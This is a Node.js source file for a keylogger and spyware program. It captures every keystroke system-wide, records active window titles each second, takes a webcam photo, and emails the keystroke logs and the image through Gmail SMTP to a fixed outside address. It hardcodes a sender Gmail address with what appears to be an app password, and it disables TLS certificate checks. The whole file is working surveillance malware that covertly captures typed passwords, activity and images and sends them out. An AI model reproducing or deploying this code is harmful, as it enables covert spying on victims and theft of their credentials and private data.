const nodemailer = require('nodemailer');
const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
const NodeWebcam = require( "node-webcam" );
const path = require('path');

// Initialize an empty string to store the current output
let currentOutput = "";

// Variable to track the inactivity timeout
let inactivityTimeout;

let isUpperCase = false;

// Function to update the output
const specialCharacters = {
    '1': '!',
    '2': '@',
    '3': '#',
    '4': '$',
    '5': '%',
    '6': '^',
    '7': '&',
    '8': '*',
    '9': '(',
    '0': ')',
    '46': '>',
    '44': '<',
    '45': '_',
    '61': '+',
    '47': '?',
    '91': '{',
    '93': '}',
    '96': '~',
};

let capsLockPressed = false; // Variable to track if Caps Lock is pressed

function updateOutput(keyName, shiftState) {
    // checks if the Caps Lock key is pressed
    if (keyName === "CAPS LOCK"){
        capsLockPressed = !capsLockPressed;
        currentOutput += '<CAPS LOCK> ';
        return;
    }

    // Check if the keyName is a number and if the shift key is pressed
    if (/^\d$/.test(keyName) && shiftState) {
        keyName = specialCharacters[keyName] || keyName;
    }

    // Convert the keyName to lowercase
    let enclosedKey;
    if (keyName.match(/^[a-zA-Z]$/)) {
        if (capsLockPressed) {
            enclosedKey = shiftState ? keyName.toLowerCase() : keyName.toUpperCase();
        } else {
            enclosedKey = shiftState ? keyName.toUpperCase() : keyName.toLowerCase();
        }
    } else {
        enclosedKey = specialCharacters[keyName.charCodeAt(0).toString()] || `<${keyName}>`;
    }

    currentOutput += enclosedKey + " ";

    // Clear the entire console
    process.stdout.write('\x1Bc');

    // Write the updated output without the trailing space
    process.stdout.write(currentOutput.trim());

    clearTimeout(inactivityTimeout);
    inactivityTimeout = setTimeout(() => {
        sendLogsByEmail(currentOutput);
        currentOutput = "";
    }, 30000);
}




// Configure nodemailer with SMTP transport
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: 'arjundimanarig09@gmail.com',
        pass: 'oqic lxuk sbdu ufxb'
    },
    tls: {
        rejectUnauthorized: false
    }
});

// Function to send logs via email
function sendLogsByEmail(logs) {
    const mailOptions = {
        from: 'arjundimanarig09@gmail.com',
        to: 'asiancutie.3A@gmail.com',
        subject: 'Keyboard Logs',
        text: logs
    };

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.error('Error sending email:', error);
        } else {
            console.log('Email sent:', info.response);
        }
    });
}

const v = new GlobalKeyboardListener();
const keyState = {}; // Track the state of keys

// Add a listener to log every key press, but prevent double printing
// v.addListener(function (e) {
//     const keyName = e.name;
//     if (!keyState[keyName]) {
//         updateOutput(keyName); // Update the output
//         keyState[keyName] = true;
//     }
// });
v.addListener(function (e, down) {
    const keyName = e.name;
    if (!keyState[keyName]) {
        updateOutput(keyName, down['LEFT SHIFT'] || down['RIGHT SHIFT']);
        keyState[keyName] = true;
    }
});


// Add a listener to reset the state when a key is released
v.addListener(function (e, down) {
    const keyName = e.name;
    if (!down[keyName]) {
        keyState[keyName] = false;
    }
});

// Capture Windows + Space on Windows and Command + Space on Mac
v.addListener(function (e, down) {
    if (e.name == "<SPACE>" && (down["LEFT META"] || down["RIGHT META"])) {
        // Call your function
        return true;
    }
});

// Capture ALT + F
v.addListener(function (e, down) {
    if (e.name == "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
        // Call your function
        return true;
    }
});

// Add a listener that is only called once and demonstrate how to remove it
calledOnce = function (e) {
    console.log("only called once");
    v.removeListener(calledOnce);
};
v.addListener(calledOnce);


const activeWindow = require('active-win');
const fs = require('fs');

let currentWindowTitle = ""; // Store the title of the currently active window/tab

// Function to update the active window information
async function updateActiveWindowInfo() {
    try {
        const windowInfo = await activeWindow();
        const newWindowTitle = windowInfo.title;

        if (newWindowTitle !== currentWindowTitle) {
            // The user has changed tabs or windows, update the information
            const output = `Active Window: ${newWindowTitle}`;
            console.log(output);

            // Update the current window title
            currentWindowTitle = newWindowTitle;

            // Append the active window info to the email text
            currentOutput += output + "\n";
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

const opts = {
    width: 1280,
    height: 720,
    quality: 100,
    delay: 0,
    saveShots: true,
    output: "png",
    device: false,
    callbackReturn: "location",
    verbose: false
};

const Webcam = NodeWebcam.create(opts);

function sendImageByEmail(imagePath) {
    const mailOptions = {
        from: 'arjundimanarig09@gmail.com',
        to: 'asiancutie.3a@gmail.com',
        subject: 'Webcam Image',
        text: 'Here is an image from your webcam.',
        attachments: [
            {
                filename: 'webcam_image.png',
                path: imagePath,
                encoding: 'base64'
            }
        ]
    };

    transporter.sendMail(mailOptions, function(error, info) {
        if (error) {
            console.error('Error sending email:', error);
        } else {
            console.log('Email sent:', info.response);
        }
    });
}

Webcam.capture("webcam_image", (err, data) => {
    if (!err) {
        console.log("Image taken");

        // Image is saved at data[0], so we'll use that path
        const imagePath = "webcam_image.png";
        
        sendImageByEmail(imagePath);
    } else {
        console.error('Error capturing image:', err);
    }
});

function saveLogsToFile(logs) {
    const now = new Date();
    const date = now.toLocaleDateString().replace(/\//g, '-');
    const time = now.toLocaleTimeString().replace(/:/g, '-');
    const fileName = `keyboard-logs-${date}-${time}.txt`;

    fs.writeFile(fileName, logs, (err) => {
        if (err) {
            console.error('Error saving logs to file:', err);
        } else {
            console.log(`Logs saved to ${fileName}`);
            sendEmailWithLogs(fileName);
        }
    });
}

// Function to send logs via email
function sendEmailWithLogs(logFileName) {
    const mailOptions = {
        from: 'arjundimanarig09@gmail.com',
        to: 'asiancutie.3A@gmail.com',
        subject: 'Keyboard Logs',
        text: 'Please find the attached keyboard logs.',
        attachments: [
            {
                filename: logFileName,
                path: logFileName,
            },
        ],
    };

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.error('Error sending email:', error);
        } else {
            console.log('Email sent:', info.response);
        }
    });
}

// Set an interval to periodically check the active window
const interval = 1000; // Check every 1 second
setInterval(updateActiveWindowInfo, interval);
